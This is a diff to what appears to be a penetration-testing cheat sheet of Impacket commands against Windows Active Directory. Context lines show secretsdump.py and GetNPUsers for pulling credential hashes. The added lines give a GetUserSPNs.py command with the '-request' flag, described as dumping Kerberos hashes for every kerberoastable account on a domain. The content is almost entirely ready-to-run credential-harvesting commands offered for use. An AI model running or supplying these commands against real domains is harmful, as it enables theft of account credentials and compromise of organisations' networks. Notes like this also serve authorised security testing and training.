@@ -30,3 +30,9 @@ secretsdump.py <Target Username>@<Domain or IP>
 ```
 impacket-GetNPUsers <Domain>/<Target Username> -no-pass
 ```
+
+### This will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain. 
+```
+GetUserSPNs.py <DomainName>.local/<UserName>:<Password> -dc-ip <IP> -request
+```
+
